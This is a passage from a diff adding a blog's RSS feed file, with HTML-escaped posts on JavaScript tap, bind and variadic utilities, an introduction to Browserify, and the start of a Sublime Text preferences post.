+      <description>&lt;p&gt;There are numerous functional JavaScript libraries out in the public, many of which include a &lt;a href=&quot;http://underscorejs.org/#tap&quot;&gt;utility called tap&lt;/a&gt;. This simplistic utility serves a single purpose, to call a function with a value and return the value back to us. However, the usefulness of this utility is rarely understood and can even be confusing when looking at examples.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; tap = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(value, fn)&lt;/span&gt; {&lt;/span&gt;
+  fn(value);
+  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; value;
+};
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The code above depicts the simplicity of the function, but when would we ever use it? It’s really only useful when we want to chain the value between calls. You can pass in any function and you will always receive the passed in value as the return, regardless of the function return value.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// Pop a value of the end of an array, in reality we'd use an `invoke` utility.&lt;/span&gt;
+tap([&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;], &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(array)&lt;/span&gt; {&lt;/span&gt;
+  &lt;span class=&quot;comment&quot;&gt;// Pop always returns the value it removed from the end of the array.&lt;/span&gt;
+  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; array.pop();
+});
+&lt;span class=&quot;comment&quot;&gt;//=&amp;gt; [1, 2, 3]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    <item>
+      <title>The JavaScript Bind Function</title>
+      <link>http://www.armblog.pl/articles/javascript-bind-function/</link>
+      <pubDate>Tue, 31 Dec 2013 01:00:00 +0100</pubDate>
+      <guid isPermaLink="true">http://www.armblog.pl/articles/javascript-bind-function/</guid>
+      <author></author>
+      <description>&lt;p&gt;The JavaScript &lt;code&gt;bind&lt;/code&gt; function is a common-place utility when working with many different frameworks and libraries. It’s purpose is to bind the &lt;code&gt;this&lt;/code&gt; value to a static object and is useful when passing functions around as callbacks, where maintaining the correct &lt;code&gt;this&lt;/code&gt; value is required. A common convention to circumvent this utility is the &lt;code&gt;var that = this&lt;/code&gt;, but this isn’t very feasible everywhere.&lt;/p&gt;
+&lt;p&gt;In &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/bind&quot;&gt;modern JavaScript implementations&lt;/a&gt; the function is built directly onto &lt;code&gt;Function.prototype&lt;/code&gt;, giving us &lt;code&gt;bind&lt;/code&gt; functionality on every function. For our implementation we’ll be implementing a standalone functionality that works similar to the built-in &lt;code&gt;bind&lt;/code&gt; function.&lt;/p&gt;
+&lt;p&gt;However, it’s important to note that &lt;code&gt;bind&lt;/code&gt; also comes with another handy feature. It accepts an unlimited number of arguments after the context to pass in as the function parameters, from left to right.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; __slice = &lt;span class=&quot;built_in&quot;&gt;Array&lt;/span&gt;.prototype.slice;
+
+&lt;span class=&quot;comment&quot;&gt;/**
+ * Bind a function to a certain context.
+ *
+ * @param  {Function} fn
+ * @param  {Object}   context
+ * @param  {*}        ...
+ * @return {Function}
+ */&lt;/span&gt;
+&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; bind = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(fn, context &lt;span class=&quot;comment&quot;&gt;/*, ...args */&lt;/span&gt;)&lt;/span&gt; {&lt;/span&gt;
+  &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; args = __slice.call(&lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;);
+
+  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; {&lt;/span&gt;
+    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; fn.apply(context, args.concat(__slice.call(&lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;)));
+  };
+};
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Bind allows us to keep the &lt;code&gt;this&lt;/code&gt; context when passing the callback to another function. Imagine passing a function that uses &lt;code&gt;this&lt;/code&gt; into &lt;code&gt;setTimeout&lt;/code&gt; or someone elses library utility, where &lt;code&gt;this&lt;/code&gt; could be unpredictable.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; greet = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(greeting)&lt;/span&gt; {&lt;/span&gt;
+  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; greeting + &lt;span class=&quot;string&quot;&gt;' '&lt;/span&gt; + &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.user;
+};
+
+greet(&lt;span class=&quot;string&quot;&gt;'Hello'&lt;/span&gt;); &lt;span class=&quot;comment&quot;&gt;//=&amp;gt; &quot;Hello undefined&quot;&lt;/span&gt;
+
+&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; boundGreet = bind(greet, { user: &lt;span class=&quot;string&quot;&gt;'Bob'&lt;/span&gt; });
+
+boundGreet(&lt;span class=&quot;string&quot;&gt;'Hello'&lt;/span&gt;); &lt;span class=&quot;comment&quot;&gt;//=&amp;gt; &quot;Hello Bob&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We also have another useful feature built into &lt;code&gt;bind&lt;/code&gt; - partial application. Partial application is essentially the act of pre-filling function arguments. Any future arguments are then appended to the arguments we have already defined.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; greet = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(user, greeting)&lt;/span&gt; {&lt;/span&gt;
+  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; greeting + &lt;span class=&quot;string&quot;&gt;' '&lt;/span&gt; + user;
+};
+
+&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; greetBlake = bind(greet, &lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;'Blake'&lt;/span&gt;);
+
+greetBlake(&lt;span class=&quot;string&quot;&gt;'Hi'&lt;/span&gt;); &lt;span class=&quot;comment&quot;&gt;//=&amp;gt; &quot;Hi Blake&quot;&lt;/span&gt;
+greetBlake(&lt;span class=&quot;string&quot;&gt;'Hello'&lt;/span&gt;); &lt;span class=&quot;comment&quot;&gt;//=&amp;gt; &quot;Hello Blake&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;bonus-implementation-using-variadic&quot;&gt;Bonus Implementation using Variadic&lt;/h2&gt;
+&lt;p&gt;In my last post, I introduced the concept of a &lt;a href=&quot;http://blakeembrey.com/articles/javascript-variadic-function/&quot;&gt;variadic function&lt;/a&gt;. As this article demonstrates, &lt;code&gt;bind&lt;/code&gt; is a perfect example of a variadic function, so let’s reimplement &lt;code&gt;bind&lt;/code&gt; with the variadic function.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; bind = variadic(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(fn, context, args)&lt;/span&gt; {&lt;/span&gt;
+  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; variadic(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(called)&lt;/span&gt; {&lt;/span&gt;
+    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; fn.apply(context, args.concat(called));
+  });
+});
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    <item>
+      <title>A Variadic Utility in JavaScript</title>
+      <link>http://www.armblog.pl/articles/javascript-variadic-function/</link>
+      <pubDate>Sun, 29 Dec 2013 23:00:00 +0100</pubDate>
+      <guid isPermaLink="true">http://www.armblog.pl/articles/javascript-variadic-function/</guid>
+      <author></author>
+      <description>&lt;p&gt;A variadic function is a type of function which accepts a variable number of arguments. In JavaScript, every function can be variadic and it’s commonplace to see snippets of code using &lt;code&gt;Array.prototype.slice.call(arguments, 1)&lt;/code&gt; to get a unlimited number of trailing arguments back as an array. You can also find many instances where you would even slice all the arguments, for the sake of manipulation and array concatenation.&lt;/p&gt;
+&lt;p&gt;The ability to get all the functions trailing arguments natively would be a great inclusion to the language, and in fact &lt;a href=&quot;http://ariya.ofilabs.com/2013/03/es6-and-rest-parameter.html&quot;&gt;it’s already in the works with ES6&lt;/a&gt;. For now though, we could be stuck typing this out manually. Or we can write ourselves a &lt;a href=&quot;https://github.com/blakeembrey/variadic&quot;&gt;little utility function&lt;/a&gt; to speed up our workflow.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; __slice = &lt;span class=&quot;built_in&quot;&gt;Array&lt;/span&gt;.prototype.slice;
+
+&lt;span class=&quot;comment&quot;&gt;/**
+ * Generate a function that accepts a variable number of arguments as the last
+ * function argument.
+ *
+ * @param  {Function} fn
+ * @return {Function}
+ */&lt;/span&gt;
+&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; variadic = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(fn)&lt;/span&gt; {&lt;/span&gt;
+  &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; count = &lt;span class=&quot;built_in&quot;&gt;Math&lt;/span&gt;.max(fn.length - &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);
+
+  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; {&lt;/span&gt;
+    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; args = __slice.call(&lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, count);
+
+    &lt;span class=&quot;comment&quot;&gt;// Enforce the array length, in case we don't have enough array padding.&lt;/span&gt;
+    args.length = count;
+    args.push(__slice.call(&lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;, count));
+
+    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; fn.apply(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;, args);
+  };
+};
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The snippet above accepts a single function as its argument and returns a new function that will pass in every additional argument as an array to the last parameter.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; fn = variadic(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(args)&lt;/span&gt; {&lt;/span&gt;
+  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; args;
+});
+
+fn(); &lt;span class=&quot;comment&quot;&gt;//=&amp;gt; []&lt;/span&gt;
+fn(&lt;span class=&quot;string&quot;&gt;'a'&lt;/span&gt;); &lt;span class=&quot;comment&quot;&gt;//=&amp;gt; ['a']&lt;/span&gt;
+fn(&lt;span class=&quot;string&quot;&gt;'a'&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;'b'&lt;/span&gt;) &lt;span class=&quot;comment&quot;&gt;//=&amp;gt; ['a', 'b'];&lt;/span&gt;
+
+&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; fn = variadic(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(a, b, args)&lt;/span&gt; {&lt;/span&gt;
+  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; { a: a, b: b, args: args };
+});
+
+fn(); &lt;span class=&quot;comment&quot;&gt;//=&amp;gt; { a: undefined, b: undefined, args: [] }&lt;/span&gt;
+fn(&lt;span class=&quot;string&quot;&gt;'a'&lt;/span&gt;); &lt;span class=&quot;comment&quot;&gt;//=&amp;gt; { a: 'a', b: undefined, args: [] }&lt;/span&gt;
+fn(&lt;span class=&quot;string&quot;&gt;'a'&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;'b'&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;'c'&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;'d'&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;'e'&lt;/span&gt;); &lt;span class=&quot;comment&quot;&gt;//=&amp;gt; { a: 'a', b: 'b', args: ['c', 'd', 'e'] }&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;When might you use this in practice though? One example is the Backbone.js event triggering mechanism which accepts a variable number of arguments.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;trigger: &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(name)&lt;/span&gt; {&lt;/span&gt;
+  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._events) &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;;
+  &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; args = slice.call(&lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);
+  &lt;span class=&quot;comment&quot;&gt;// Trigger some events with the args.&lt;/span&gt;
+  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;;
+},
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Could be rewritten to simply be:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;trigger: variadic(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(name, args)&lt;/span&gt; {&lt;/span&gt;
+  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._events) &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;;
+  &lt;span class=&quot;comment&quot;&gt;// Trigger some events with the args.&lt;/span&gt;
+  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;;
+}),
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    <item>
+      <title>Introduction to Browserify</title>
+      <link>http://www.armblog.pl/articles/introduction-to-browserify/</link>
+      <pubDate>Thu, 12 Sep 2013 22:00:00 +0200</pubDate>
+      <guid isPermaLink="true">http://www.armblog.pl/articles/introduction-to-browserify/</guid>
+      <author></author>
+      <description>&lt;blockquote&gt;
+&lt;p&gt;require(‘modules’) in the browser.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;a href=&quot;https://github.com/substack/node-browserify&quot;&gt;Browserify&lt;/a&gt; is a development tool that allows us to write node.js-style modules that compile for use in the browser. Just like node, we write our modules in separate files, exporting external methods and properties using the &lt;code&gt;module.exports&lt;/code&gt; and &lt;code&gt;exports&lt;/code&gt; variables. We can even require other modules using the &lt;code&gt;require&lt;/code&gt; function, and if we omit the relative path it’ll resolve to the module in the &lt;code&gt;node_modules&lt;/code&gt; directory.&lt;/p&gt;
+&lt;h2 id=&quot;getting-started&quot;&gt;Getting Started&lt;/h2&gt;
+&lt;p&gt;Getting started with the browserify command-line tool requires node.js and npm installed.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;npm install browserify -g
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;our-first-module&quot;&gt;Our First Module&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;multiply.js:&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;module.exports = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(a, b)&lt;/span&gt; {&lt;/span&gt;
+  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; a * b;
+};
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;square.js:&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; multiply = &lt;span class=&quot;built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;'./multiply'&lt;/span&gt;);
+
+module.exports = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(n)&lt;/span&gt; {&lt;/span&gt;
+  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; multiply(n, n);
+};
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;index.js:&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; square = &lt;span class=&quot;built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;'./square'&lt;/span&gt;);
+
+console.log(square(&lt;span class=&quot;number&quot;&gt;125&lt;/span&gt;)); &lt;span class=&quot;comment&quot;&gt;//=&amp;gt; 15625&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now we have written a couple of modules that require each other, we can run browserify and generate the file for use in the browser:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;browserify index.js -o bundle.js
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now that we have a &lt;code&gt;bundle.js&lt;/code&gt; file that bundled the three modules we wrote, we can add a single script tag reference to it into our html page and it’ll execute in the browser automatically resolving &lt;code&gt;require&lt;/code&gt; calls. &lt;code&gt;&amp;lt;script src=&amp;quot;bundle.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt; and we should see &lt;code&gt;15625&lt;/code&gt; logged to the JavaScript console.&lt;/p&gt;
+&lt;h2 id=&quot;npm-browserify&quot;&gt;NPM + Browserify&lt;/h2&gt;
+&lt;p&gt;Since browserify implements the node.js module resolve algorithm, we can easily use npm to install modules from the package manager and use them inside the browser. There are lots of modules on npm that are made for tools such as browserify, but even more exciting is watching modules that were specifically written for node running in a browser environment without any effort. Let’s install &lt;code&gt;underscore&lt;/code&gt; and include it in our script.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;npm install underscore --save
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; _ = &lt;span class=&quot;built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;'underscore'&lt;/span&gt;);
+
+_.each([&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;], &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(n)&lt;/span&gt; {&lt;/span&gt;
+  console.log(n); &lt;span class=&quot;comment&quot;&gt;//=&amp;gt; 1, 2, 3&lt;/span&gt;
+});
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;node-core-modules&quot;&gt;Node-core Modules&lt;/h2&gt;
+&lt;p&gt;The biggest attraction of browserify over similar tools would have to be the inclusion of &lt;a href=&quot;https://github.com/substack/node-browserify#compatibility&quot;&gt;node.js core modules&lt;/a&gt;. Modules such as &lt;code&gt;url&lt;/code&gt;, &lt;code&gt;path&lt;/code&gt;, &lt;code&gt;stream&lt;/code&gt;, &lt;code&gt;events&lt;/code&gt; and &lt;code&gt;http&lt;/code&gt; have all been ported for use in the browser. We can’t do everything that node can do, but we can do everything a browser can do using node.js style code.&lt;/p&gt;
+&lt;p&gt;The most immediately obvious core modules that are useful on the client-side are &lt;code&gt;querystring&lt;/code&gt;, &lt;code&gt;url&lt;/code&gt; and &lt;code&gt;path&lt;/code&gt;. By requiring these core modules, we can easily parse and resolves urls, query strings and paths in a client script. On top of that, the &lt;code&gt;process&lt;/code&gt;, &lt;code&gt;Buffer&lt;/code&gt;, &lt;code&gt;__dirname&lt;/code&gt;, &lt;code&gt;__filename&lt;/code&gt; and &lt;code&gt;global&lt;/code&gt; variables are all populated with Browserify. That means we can use &lt;code&gt;process.nextTick&lt;/code&gt; to easily invoke a function on the next event loop (with full cross-browser support). A special &lt;code&gt;process.browser&lt;/code&gt; flag is also set in browserify builds, so we can do a quick check to see if the script is running in a browser environment (as opposed to node.js for all the cross-environment module developers).&lt;/p&gt;
+&lt;h2 id=&quot;transforms&quot;&gt;Transforms&lt;/h2&gt;
+&lt;p&gt;The most powerful feature in Browserify are &lt;a href=&quot;https://github.com/substack/node-browserify#list-of-source-transforms&quot;&gt;source transforms&lt;/a&gt;. A source transform is a stream injected between the resolved module and the content that is returned. A simple use case for using a source transform is compiling CoffeeScript to JavaScript. Using &lt;a href=&quot;https://github.com/substack/coffeeify&quot;&gt;coffeeify&lt;/a&gt; there is no longer a need for precompilation steps, it just works.&lt;/p&gt;
+&lt;p&gt;There are loads more transforms and you can easily write your own. Some transforms I find myself using regularly are &lt;a href=&quot;https://github.com/substack/brfs&quot;&gt;brfs&lt;/a&gt; (inlines file contents), &lt;a href=&quot;https://github.com/epeli/node-hbsfy&quot;&gt;hbsfy&lt;/a&gt; (precompile Handlebars templates, &lt;em&gt;better performance and smaller footprint&lt;/em&gt;), &lt;a href=&quot;https://github.com/hughsk/uglifyify&quot;&gt;uglifyify&lt;/a&gt; (uglify bundled modules with UglifyJS2) and &lt;a href=&quot;https://github.com/hughsk/envify&quot;&gt;envify&lt;/a&gt; (use environment variables within modules).&lt;/p&gt;
+&lt;h2 id=&quot;advanced-options&quot;&gt;Advanced Options&lt;/h2&gt;
+&lt;h3 id=&quot;debug&quot;&gt;Debug&lt;/h3&gt;
+&lt;p&gt;Using the &lt;code&gt;-d&lt;/code&gt; flag with Browserify will enable source map support. Source maps allow us to view the file in all its natural, multiple file glory. Just make sure you have source maps enabled in your dev tools, and debugging compiled scripts will become 100x easier.&lt;/p&gt;
+&lt;h3 id=&quot;stand-alone&quot;&gt;Stand-alone&lt;/h3&gt;
+&lt;p&gt;With the &lt;code&gt;-s &amp;lt;name&amp;gt;&lt;/code&gt; option, we can create a bundle for public API consumption with other browser compile and runtime tools. It uses a UMD snippet to define an AMD module, CommonJS module and even falls back to aliasing the name to the &lt;code&gt;window&lt;/code&gt; global.&lt;/p&gt;
+&lt;h3 id=&quot;external&quot;&gt;External&lt;/h3&gt;
+&lt;p&gt;In a production website environment, you’ll probably want to cut down on duplicate code being included by different modules. This can be done by using the &lt;code&gt;-x&lt;/code&gt; flag, which specifies a module that should not be bundled directly with the build and instead required from the page itself. Combine this with the &lt;code&gt;-r&lt;/code&gt; flag to explicitly require modules into a bundle, we can factor out common module dependencies and create a separate bundle.&lt;/p&gt;
+&lt;h3 id=&quot;browserify-shim&quot;&gt;Browserify Shim&lt;/h3&gt;
+&lt;p&gt;You’ll probably find some module that can’t simply be required because it was written for the browser environment. Conviently, we can write a simple polyfill using &lt;code&gt;module.exports = window.$&lt;/code&gt; or similar. But what if it has dependencies in the global that we have used &lt;code&gt;require&lt;/code&gt; with? We could alter the snippet a bit more and alias required modules, but even easier is the &lt;a href=&quot;https://github.com/thlorenz/browserify-shim&quot;&gt;browserify-shim&lt;/a&gt; module that was written specifically with this purpose in mind.&lt;/p&gt;
+&lt;h3 id=&quot;grunt-task&quot;&gt;Grunt task&lt;/h3&gt;
+&lt;p&gt;Lots of people use Grunt everyday to run their build scripts, and browserify is no exception. &lt;a href=&quot;https://github.com/jmreidy/grunt-browserify&quot;&gt;Grunt-browserify&lt;/a&gt; provides an awesome grunt configuration for setting up your browserify builds and even comes with some extra sugar on top, such as a bundled &lt;code&gt;browserify-shim&lt;/code&gt; config option.&lt;/p&gt;
+&lt;h3 id=&quot;browser-field-package-json-&quot;&gt;Browser Field (package.json)&lt;/h3&gt;
+&lt;p&gt;Browserify also supports the &lt;a href=&quot;https://gist.github.com/shtylman/4339901&quot;&gt;browser&lt;/a&gt; field in &lt;code&gt;package.json&lt;/code&gt; files. This allows module developers to specify specific files that should be used in browser builds, in the case that the module has node-specific code that can’t or shouldn’t be browserified.&lt;/p&gt;
+&lt;h2 id=&quot;next-steps&quot;&gt;Next Steps&lt;/h2&gt;
+&lt;p&gt;This has been a very brief introduction to Browserify and I haven’t even covered everything that is possible. The &lt;a href=&quot;https://github.com/substack/node-browserify&quot;&gt;browserify docs&lt;/a&gt; cover plenty of information and additional flags, so definitely take a quick look. Feel free to leave a comment with any issues you have, I’d love to help out and write a follow up post that covers more uses.&lt;/p&gt;
+</description>
+    </item>
+    <item>
+      <title>My Sublime Text Preferences Explained</title>
+      <link>http://www.armblog.pl/articles/sublime-text-preferences/</link>
+      <pubDate>Sun, 11  Aug 2013 22:20:00 +0200</pubDate>
+      <guid isPermaLink="true">http://www.armblog.pl/articles/sublime-text-preferences/</guid>
+      <author></author>
+      <description>&lt;p&gt;Prompted by the many preference file posts recently, I have finally gotten around to posting my config with a few inline comments.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;{
+  &lt;span class=&quot;comment&quot;&gt;// Makes folders stand out from files&lt;/span&gt;
+  &lt;span class=&quot;string&quot;&gt;&quot;bold_folder_labels&quot;&lt;/span&gt;: &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;,
+  &lt;span class=&quot;comment&quot;&gt;// Clean colour scheme, comes with Flatland theme&lt;/span&gt;
+  &lt;span class=&quot;string&quot;&gt;&quot;color_scheme&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;Packages/Theme - Flatland/Flatland Monokai.tmTheme&quot;&lt;/span&gt;,
+  &lt;span class=&quot;comment&quot;&gt;// Switch to `all` to always show invisibles&lt;/span&gt;
+  &lt;span class=&quot;string&quot;&gt;&quot;draw_white_space&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;selection&quot;&lt;/span&gt;,
+  &lt;span class=&quot;comment&quot;&gt;// Always adds a trailing newline character&lt;/span&gt;
+  &lt;span class=&quot;string&quot;&gt;&quot;ensure_newline_at_eof_on_save&quot;&lt;/span&gt;: &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;,
+  &lt;span class=&quot;comment&quot;&gt;// Exludes directories from showing up in the sidebar and search&lt;/span&gt;
+  &lt;span class=&quot;string&quot;&gt;&quot;folder_exclude_patterns&quot;&lt;/span&gt;: [
+    &lt;span class=&quot;string&quot;&gt;&quot;.svn&quot;&lt;/span&gt;,
+    &lt;span class=&quot;string&quot;&gt;&quot;.git&quot;&lt;/span&gt;,
+    &lt;span class=&quot;string&quot;&gt;&quot;.hg&quot;&lt;/span&gt;,
+    &lt;span class=&quot;string&quot;&gt;&quot;CVS&quot;&lt;/span&gt;,
+    &lt;span class=&quot;string&quot;&gt;&quot;node_modules&quot;&lt;/span&gt;,
+    &lt;span class=&quot;string&quot;&gt;&quot;bower_components&quot;&lt;/span&gt;
+  ],
+  &lt;span class=&quot;comment&quot;&gt;// Source Code Pro is my favourite monospace font - download at https://github.com/adobe/source-code-pro&lt;/span&gt;
